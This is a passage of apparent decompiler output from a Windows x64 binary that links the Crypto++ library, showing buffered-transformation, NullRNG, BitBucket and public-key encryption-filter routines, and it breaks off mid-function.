// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10F760) ----------------------------------------------------
_QWORD *__fastcall sub_13F10F760(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // r8
  void (__fastcall ***v7)(_QWORD, __int64); // rcx

  v4 = 21i64;
  if ( a1[20] < a1[21] )
    v4 = 20i64;
  v5 = a1[v4];
  v6 = (void *)a1[22];
  if ( v6 )
  {
    memset(v6, 0, v5);
    sub_13F12E550(v6);
  }
  sub_13F1315A0(a1 + 9);
  v7 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v7 )
    (**v7)(v7, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 184i64);
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10F800) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10F800(
        __int64 a1,
        const __m128i *a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        unsigned __int64 a5,
        char a6)
{
  unsigned int v10; // eax
  unsigned __int64 v12; // rsi
  __int64 v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // r13
  bool v16; // al
  unsigned __int64 v17; // r14
  int v18; // er12
  unsigned __int64 v19; // r8
  const __m128i *v20; // rdx
  __int64 v22; // [rsp+20h] [rbp-48h]
  unsigned int v23; // [rsp+70h] [rbp+8h]
  __int64 v24; // [rsp+80h] [rbp+18h]
  bool v25; // [rsp+98h] [rbp+30h]

  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64))(a1);
  v12 = a5;
  v13 = 0i64;
  v14 = v10;
  v15 = v10;
  v23 = v10;
  if ( (a6 & 3) != 0 )
    v15 = 0i64;
  if ( a3 )
    v13 = v10;
  v22 = v13;
  if ( (a6 & 2) != 0 )
    v10 = 0;
  v24 = v10;
  if ( (a6 & 8) != 0 )
  {
    v22 = -v13;
    a2 = (const __m128i *)((char *)a2 + a5 - v14);
    v15 = -v15;
    a3 += a5 - v14;
    a4 += a5 - v14;
    v24 = -(__int64)v10;
  }
  v16 = a3 && (a6 & 4) != 0;
  v17 = (unsigned int)v14;
  v25 = v16;
  if ( a5 >= (unsigned int)v14 )
  {
    v18 = a6 & 1;
    do
    {
      if ( v16 )
      {
        sub_13F133BE0(a4, a3, a2, v17);
        v19 = 0i64;
        v20 = (const __m128i *)a4;
      }
      else
      {
        v19 = a3;
        v20 = a2;
      }
      (*(void (__fastcall **)(__int64, const __m128i *, unsigned __int64, unsigned __int64))(*(_QWORD *)a1 + 32i64))(
        a1,
        v20,
        v19,
        a4);
      if ( v18 )
        ++a2->m128i_i8[v23 - 1];
      a4 += v24;
      a2 = (const __m128i *)((char *)a2 + v15);
      a3 += v22;
      v12 -= v17;
      v16 = v25;
    }
    while ( v12 >= v17 );
  }
  return v12;
}

//----- (000000013F10F950) ----------------------------------------------------
__m128i *__fastcall sub_13F10F950(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C30(a2, (const __m128i *)"BitBucket");
  return a2;
}

//----- (000000013F10F990) ----------------------------------------------------
__m128i *__fastcall sub_13F10F990(__int64 a1, __m128i *a2)
{
  a2[1].m128i_i64[0] = 0i64;
  a2[1].m128i_i64[1] = 15i64;
  a2->m128i_i8[0] = 0;
  sub_13F106C30(a2, (const __m128i *)"NullRNG");
  return a2;
}

//----- (000000013F10F9D0) ----------------------------------------------------
char __fastcall sub_13F10F9D0(__int64 *a1)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rax

  v2 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 328))(a1);
  v3 = *a1;
  if ( !v2 )
    return (*(unsigned int (__fastcall **)(__int64 *))(v3 + 192))(a1) != 0;
  v4 = (*(__int64 (__fastcall **)(__int64 *))(v3 + 328))(a1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 200i64))(v4);
}

//----- (000000013F10FA20) ----------------------------------------------------
char __fastcall sub_13F10FA20(__int64 *a1)
{
  __int64 v2; // rax
  __int64 v3; // r8
  __int64 v4; // rax
  char v6; // [rsp+30h] [rbp+8h] BYREF

  v2 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 328))(a1);
  v3 = *a1;
  if ( !v2 )
    return (*(__int64 (__fastcall **)(__int64 *, char *))(v3 + 168))(a1, &v6) != 0;
  v4 = (*(__int64 (__fastcall **)(__int64 *))(v3 + 328))(a1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 136i64))(v4);
}

//----- (000000013F10FA70) ----------------------------------------------------
__int64 __fastcall sub_13F10FA70(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rax

  if ( !(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1) )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 344i64))(a1, a2);
  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v4 + 320i64))(v4) )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 344i64))(a1, a2);
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 352i64))(v5, a2);
}

//----- (000000013F10FAF0) ----------------------------------------------------
__int64 __fastcall sub_13F10FAF0(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  const __m128i *v5; // rax
  char v6[40]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  v3 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
  {
    v5 = (const __m128i *)(*(__int64 (__fastcall **)(__int64 *, char *))(v3 + 16))(a1, v6);
    sub_13F10F3D0((__int64)pExceptionObject, v5);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, __int64))(v3 + 32))(a1, a3);
}
// 13F10FAF0: using guessed type char var_80[40];

//----- (000000013F10FB70) ----------------------------------------------------
__int64 __fastcall sub_13F10FB70(__int64 *a1, __int64 a2, unsigned __int8 a3, unsigned int a4, unsigned __int8 a5)
{
  __int64 v5; // rax
  const __m128i *v7; // rax
  char v8[40]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  v5 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
  {
    v7 = (const __m128i *)(*(__int64 (__fastcall **)(__int64 *, char *))(v5 + 16))(a1, v8);
    sub_13F10F3D0((__int64)pExceptionObject, v7);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD, _QWORD, __int64))(v5 + 96))(a1, a3, a4, a5, -2i64);
}
// 13F10FB70: using guessed type char var_80[40];

//----- (000000013F10FC00) ----------------------------------------------------
__int64 __fastcall sub_13F10FC00(__int64 *a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  __int64 v4; // rax
  const __m128i *v6; // rax
  char v7[40]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  v4 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
  {
    v6 = (const __m128i *)(*(__int64 (__fastcall **)(__int64 *, char *, __int64, _QWORD, __int64))(v4 + 16))(
                            a1,
                            v7,
                            a3,
                            (unsigned int)a3,
                            -2i64);
    sub_13F10F3D0((__int64)pExceptionObject, v6);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD))(v4 + 104))(a1, (unsigned int)a3, a4);
}
// 13F10FC00: using guessed type char var_80[40];

//----- (000000013F10FC80) ----------------------------------------------------
__int64 __fastcall sub_13F10FC80(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, char a6)
{
  const __m128i *v7; // rax
  char v9[40]; // [rsp+38h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-58h] BYREF

  if ( *(_QWORD *)(a2 + 16) )
  {
    v7 = (const __m128i *)(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 16i64))(a1, v9);
    sub_13F10F3D0((__int64)pExceptionObject, v7);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)a1 + 48i64))(
           a1,
           a3,
           a4,
           a5,
           a6);
}
// 13F10FC80: using guessed type char var_80[40];

//----- (000000013F10FD20) ----------------------------------------------------
__int64 __fastcall sub_13F10FD20(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, char a6)
{
  __int64 v6; // rbx

  v6 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
    return (*(__int64 (__fastcall **)(__int64 *))(v6 + 280))(a1);
  else
    return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64, _QWORD))(v6 + 56))(a1, a3, a4, a5);
}

//----- (000000013F10FD60) ----------------------------------------------------
__int64 __fastcall sub_13F10FD60(__int64 a1, __int64 a2, unsigned int a3, __int64 a4)
{
  __int64 result; // rax
  __int64 v9; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1);
  if ( result )
  {
    v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1);
    return sub_13F10FD60(v9, a2, a3, a4);
  }
  return result;
}

//----- (000000013F10FDC0) ----------------------------------------------------
__int64 __fastcall sub_13F10FDC0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax
  __int64 v9; // rbx

  result = sub_13F14059C(200i64);
  v9 = result;
  if ( result )
  {
    sub_13F128E90(result, 0i64);
    *(_QWORD *)v9 = off_13F183B00;
    *(_QWORD *)(v9 + 8) = off_13F183C90;
    *(_QWORD *)(v9 + 48) = a2;
    *(_QWORD *)(v9 + 56) = a1;
    *(_QWORD *)(v9 + 64) = a4;
    sub_13F131450(v9 + 72, 0i64);
    *(_QWORD *)(v9 + 160) = -1i64;
    *(_QWORD *)(v9 + 168) = 0i64;
    *(_QWORD *)(v9 + 176) = 0i64;
    *(_BYTE *)(v9 + 184) = 0;
    *(_QWORD *)(v9 + 192) = 0i64;
    sub_13F129580(v9, a3);
    return v9;
  }
  return result;
}
// 13F183B00: using guessed type __int64 (__fastcall *off_13F183B00[50])();
// 13F183C90: using guessed type __int64 (__fastcall *off_13F183C90[3])();

//----- (000000013F10FE90) ----------------------------------------------------
_QWORD *__fastcall sub_13F10FE90(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rax
  _QWORD *v9; // rbx

  v8 = sub_13F14059C(184i64);
  v9 = (_QWORD *)v8;
  if ( !v8 )
    return 0i64;
  sub_13F128E90(v8, 0i64);
  *v9 = &CryptoPP::PK_DefaultEncryptionFilter::`vftable';
  v9[1] = off_13F183AE0;
  v9[6] = a2;
  v9[7] = a1;
  v9[8] = a4;
  sub_13F131450((__int64)(v9 + 9), 0i64);
  v9[20] = -1i64;
  v9[21] = 0i64;
  v9[22] = 0i64;
  sub_13F129580((__int64)v9, a3);
  return v9;
}
// 13F183950: using guessed type void *CryptoPP::PK_DefaultEncryptionFilter::`vftable';
// 13F183AE0: using guessed type void *off_13F183AE0[4];

//----- (000000013F10FF50) ----------------------------------------------------
__int64 __fastcall sub_13F10FF50(__int64 *a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 *v5; // rax

  v2 = *a1;
  v5 = sub_13F1112C0();
  return (*(__int64 (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64))(v2 + 80))(a1, v5, &qword_13F1B7008, a2);
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F10FFA0) ----------------------------------------------------
__int64 __fastcall sub_13F10FFA0(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 72i64))(a1, a2, a4);
}

//----- (000000013F10FFB0) ----------------------------------------------------
__int64 __fastcall sub_13F10FFB0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48i64))(a1) & 1;
}

//----- (000000013F10FFD0) ----------------------------------------------------
void __noreturn sub_13F10FFD0()
{
  __m128i v0[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  sub_13F1053B0(
    v0,
    (const __m128i *)"NullRNG: NullRNG should only be passed to functions that don't need to generate random bytes");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F10FFD0: using guessed type __m128i var_80[2];

//----- (000000013F110030) ----------------------------------------------------
__int64 __fastcall sub_13F110030(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD v4[6]; // [rsp+28h] [rbp-40h] BYREF

  v4[3] = a2;
  v4[4] = a3;
  v4[5] = 0i64;
  return (*(__int64 (__fastcall **)(__int64, _QWORD *, __int64 *, __int64, __int64, __int64 (__fastcall **)(), void **))(*(_QWORD *)a1 + 80i64))(
           a1,
           v4,
           &qword_13F1B7008,
           a3,
           -2i64,
           off_13F182988,
           off_13F182AF8);
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F1100A0) ----------------------------------------------------
__int64 __fastcall sub_13F1100A0(__int64 a1)
{
  unsigned __int8 v2; // [rsp+30h] [rbp+8h] BYREF

  (*(void (__fastcall **)(__int64, unsigned __int8 *, __int64))(*(_QWORD *)a1 + 72i64))(a1, &v2, 1i64);
  return v2;
}

//----- (000000013F1100C0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1100C0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 result; // rax
  unsigned __int64 v9; // rcx
  char *v10; // rdx
  unsigned __int64 v11; // rdi
  int v12; // [rsp+28h] [rbp-170h]
  __int64 v13; // [rsp+30h] [rbp-168h]
  char v14[264]; // [rsp+38h] [rbp-160h] BYREF
  unsigned __int64 v15; // [rsp+140h] [rbp-58h]
  unsigned __int64 v16; // [rsp+148h] [rbp-50h]
  char *v17; // [rsp+150h] [rbp-48h]

  v13 = -2i64;
  v4 = a4;
  result = -1i64;
  v15 = -1i64;
  v9 = 256i64;
  v16 = 256i64;
  v14[257] = 1;
  v10 = v14;
  v17 = v14;
  if ( a4 )
  {
    do
    {
      v11 = v4;
      if ( v4 >= v9 )
        v11 = v9;
      (*(void (__fastcall **)(__int64, char *, unsigned __int64))(*(_QWORD *)a1 + 72i64))(a1, v10, v11);
      LOBYTE(v12) = 1;
      (*(void (__fastcall **)(__int64, __int64, char *, unsigned __int64, _DWORD, int, __int64))(*(_QWORD *)a2 + 280i64))(
        a2,
        a3,
        v17,
        v11,
        0,
        v12,
        v13);
      v4 -= v11;
      v10 = v17;
      v9 = v16;
    }
    while ( v4 );
    result = v15;
  }
  if ( v10 == v14 )
  {
    if ( result < v9 )
      v9 = result;
    result = 0i64;
    memset(v10, 0, v9);
  }
  return result;
}
// 13F110164: variable 'v12' is possibly undefined
// 13F110164: variable 'v13' is possibly undefined
// 13F1100C0: using guessed type char var_160[264];

//----- (000000013F1101C0) ----------------------------------------------------
__int64 __fastcall sub_13F1101C0(__int64 a1, int a2, int a3)
{
  unsigned int v5; // edi
  unsigned int v6; // er9
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned __int64 v9; // rbx
  unsigned int v10; // eax
  unsigned int v12; // [rsp+38h] [rbp+10h] BYREF

  v5 = a3 - a2;
  if ( a3 == a2 )
  {
    v6 = 0;
  }
  else
  {
    v7 = 0;
    v6 = 32;
    do
    {
      v8 = (v6 + v7) >> 1;
      if ( !(v5 >> v8) )
        v6 = (v6 + v7) >> 1;
      if ( !(v5 >> v8) )
        v8 = v7;
      v7 = v8;
    }
    while ( v6 - v8 > 1 );
  }
  v9 = v6;
  do
  {
    (*(void (__fastcall **)(__int64, unsigned int *, __int64))(*(_QWORD *)a1 + 72i64))(a1, &v12, 4i64);
    if ( v9 >= 0x20 )
      v10 = v12;
    else
      v10 = v12 & ((1 << v9) - 1);
    v12 = v10;
  }
  while ( v10 > v5 );
  return a2 + v10;
}

//----- (000000013F110270) ----------------------------------------------------
__int64 __fastcall sub_13F110270(__int64 *a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // r9
  __int64 v6; // rax

  v4 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 336))(a1);
  v5 = *a1;
  if ( !v4 )
    return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v5 + 144))(a1, a2, 1i64);
  v6 = (*(__int64 (__fastcall **)(__int64 *))(v5 + 336))(a1);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 152i64))(v6, a2);
}

//----- (000000013F1102D0) ----------------------------------------------------
__int64 __fastcall sub_13F1102D0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  char v8; // [rsp+20h] [rbp-78h]
  __int64 v9[2]; // [rsp+30h] [rbp-68h] BYREF
  __int64 v10[6]; // [rsp+40h] [rbp-58h] BYREF

  v9[1] = -2i64;
  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1) )
  {
    v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 144i64))(v6, a2, a3);
  }
  else
  {
    v10[0] = (__int64)off_13F182988;
    v10[1] = (__int64)off_13F182AF8;
    v10[3] = a2;
    v10[4] = a3;
    v10[5] = 0i64;
    v9[0] = a3;
    v8 = 1;
    (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, char))(*(_QWORD *)a1 + 256i64))(
      a1,
      v10,
      v9,
      &qword_13F1B7008,
      v8);
    return v9[0];
  }
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F1103A0) ----------------------------------------------------
__int64 __fastcall sub_13F1103A0(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 328i64))(a1 - 8);
  if ( result )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(result + 8) + 8i64))(result + 8);
  return result;
}

//----- (000000013F1103D0) ----------------------------------------------------
__int64 __fastcall sub_13F1103D0(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 v4; // rbx
  unsigned int v6; // eax

  v4 = *a2;
  v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v4 + 72))(a2, a3, v6);
}

//----- (000000013F110410) ----------------------------------------------------
__int64 __fastcall sub_13F110410(__int64 a1)
{
  __int64 result; // rax
  __int64 v3; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
  if ( result )
  {
    v3 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 208i64))(v3);
  }
  return result;
}

//----- (000000013F110450) ----------------------------------------------------
__int64 __fastcall sub_13F110450(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 336i64))(a1 - 8);
  if ( result )
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)(result + 8) + 16i64))(result + 8, a2, a3);
  return result;
}

//----- (000000013F110490) ----------------------------------------------------
__int64 __fastcall sub_13F110490(__int64 *a1, unsigned __int16 *a2, int a3)
{
  __int64 v3; // rax
  __int64 v7; // rdx
  unsigned __int16 v8; // r8
  unsigned __int16 v10; // [rsp+40h] [rbp+18h] BYREF

  v3 = *a1;
  v10 = 0;
  v7 = (*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *, __int64))(v3 + 160))(a1, &v10, 2i64);
  if ( a3 == 1 )
    v8 = _byteswap_ushort(v10);
  else
    v8 = v10;
  *a2 = v8;
  return (*(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 176))(a1, v7);
}

//----- (000000013F110520) ----------------------------------------------------
void __noreturn sub_13F110520()
{
  __m128i v0[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"RandomNumberGenerator: IncorporateEntropy not implemented");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F110520: using guessed type __m128i var_80[2];

//----- (000000013F110580) ----------------------------------------------------
__int64 __fastcall sub_13F110580(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
}

//----- (000000013F110590) ----------------------------------------------------
void __noreturn sub_13F110590()
{
  __m128i v0[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"BufferedTransformation: this object can't be reinitialized");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F110590: using guessed type __m128i var_80[2];

//----- (000000013F1105F0) ----------------------------------------------------
__int64 __fastcall sub_13F1105F0(__int64 *a1)
{
  __int64 v2; // rax
  __int64 *v4; // rax
  __int64 v5; // r10
  char v6; // [rsp+28h] [rbp-10h]
  __int64 v7; // [rsp+40h] [rbp+8h] BYREF

  if ( (*(__int64 (__fastcall **)(__int64 *))(*a1 + 328))(a1) )
  {
    v2 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 328))(a1);
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 128i64))(v2);
  }
  else
  {
    v4 = sub_13F1112C0();
    v5 = *a1;
    v6 = 1;
    v7 = 0i64;
    (*(void (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64, __int64 *, char))(v5 + 264))(
      a1,
      v4,
      &v7,
      -1i64,
      &qword_13F1B7008,
      v6);
    return v7;
  }
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F110670) ----------------------------------------------------
__int64 __fastcall sub_13F110670(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  return (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 80i64))(a1, a3);
}

//----- (000000013F110680) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void ***sub_13F110680()
{
  if ( *(int *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) < -2147483643 )
    sub_13F14045C(&dword_13F1C4380);
  return &off_13F1C4378;
}
// 13F1106EB: write access to const memory at 13F1C4378 has been detected
// 13F1C4378: using guessed type void **off_13F1C4378;
// 13F1C4380: using guessed type int dword_13F1C4380;
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F1107C0) ----------------------------------------------------
__int64 __fastcall sub_13F1107C0(__int64 a1)
{
  __int64 v2; // rax
  __int64 *v4; // rsi
  unsigned int v5; // edi
  __int64 v6; // rax

  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1) )
  {
    v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1);
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 192i64))(v2);
  }
  else
  {
    v4 = sub_13F1112C0();
    v5 = 0;
    if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1) )
    {
      v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1);
      return (unsigned int)sub_13F10FD60(v6, (__int64)v4, 0xFFFFFFFF, (__int64)&qword_13F1B7008);
    }
    return v5;
  }
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F110860) ----------------------------------------------------
__int64 __fastcall sub_13F110860(__int64 *a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // r9
  __int64 v6; // rax

  v4 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 328))(a1);
  v5 = *a1;
  if ( !v4 )
    return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v5 + 160))(a1, a2, 1i64);
  v6 = (*(__int64 (__fastcall **)(__int64 *))(v5 + 328))(a1);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 168i64))(v6, a2);
}

//----- (000000013F1108C0) ----------------------------------------------------
__int64 __fastcall sub_13F1108C0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  char v8; // [rsp+28h] [rbp-70h]
  __int64 v9[2]; // [rsp+30h] [rbp-68h] BYREF
  __int64 v10[6]; // [rsp+40h] [rbp-58h] BYREF

  v9[1] = -2i64;
  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1) )
  {
    v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1);
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 160i64))(v6, a2, a3);
  }
  else
  {
    v10[0] = (__int64)off_13F182988;
    v10[1] = (__int64)off_13F182AF8;
    v10[3] = a2;
    v10[4] = a3;
    v10[5] = 0i64;
    v9[0] = 0i64;
    v8 = 1;
    (*(void (__fastcall **)(__int64, __int64 *, __int64 *, __int64, __int64 *, char))(*(_QWORD *)a1 + 264i64))(
      a1,
      v10,
      v9,
      a3,
      &qword_13F1B7008,
      v8);
    return v9[0];
  }
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F1109A0) ----------------------------------------------------
__int64 __fastcall sub_13F1109A0(__int64 *a1, _WORD *a2, int a3)
{
  __int64 v3; // rax
  __int64 result; // rax
  unsigned __int16 v7; // [rsp+40h] [rbp+18h] BYREF

  v3 = *a1;
  v7 = 0;
  result = (*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *, __int64))(v3 + 160))(a1, &v7, 2i64);
  if ( a3 == 1 )
    *a2 = _byteswap_ushort(v7);
  else
    *a2 = (unsigned __int8)v7 | (HIBYTE(v7) << 8);
  return result;
}

//----- (000000013F110A20) ----------------------------------------------------
__int64 __fastcall sub_13F110A20(__int64 a1, __int64 a2, __int64 a3, int a4, char a5)
{
  int v7; // ecx
  void *v9; // rsi
  __int64 v10; // rbp
  unsigned __int64 v11; // r12
  __int64 v12; // rdi
  __m128i *v13; // rax
  __m128i *v14; // rax
  char v15; // [rsp+20h] [rbp-118h]
  char v16[32]; // [rsp+68h] [rbp-D0h] BYREF
  __m128i v17[2]; // [rsp+88h] [rbp-B0h] BYREF
  char pExceptionObject[64]; // [rsp+B0h] [rbp-88h] BYREF

  v7 = *(_DWORD *)(a1 + 40);
  if ( v7 )
  {
    if ( v7 != 1 )
      return 0i64;
  }
  else
  {
    v9 = 0i64;
    *(_QWORD *)(a1 + 32) = 0i64;
    v15 = 1;
    (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)(a1 + 72) + 48i64))(
      a1 + 72,
      a2,
      a3,
      0i64,
      v15);
    if ( !a4 )
      return 0i64;
    v10 = sub_13F131BC0(a1 + 72);
    v11 = (*(__int64 (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 56) + 8i64))(*(_QWORD *)(a1 + 56), v10);
    if ( v10 )
      v9 = (void *)sub_13F12E4E0(v10);
    (*(void (__fastcall **)(__int64, void *, __int64))(*(_QWORD *)(a1 + 72) + 144i64))(a1 + 72, v9, v10);
    sub_13F10D290((_QWORD *)(a1 + 152), v11);
    *(_OWORD *)(a1 + 184) = *(_OWORD *)(*(__int64 (__fastcall **)(_QWORD, char *, _QWORD, void *, __int64, _QWORD, _QWORD))(**(_QWORD **)(a1 + 56) + 48i64))(
                                         *(_QWORD *)(a1 + 56),
                                         v16,
                                         *(_QWORD *)(a1 + 48),
                                         v9,
                                         v10,
                                         *(_QWORD *)(a1 + 176),
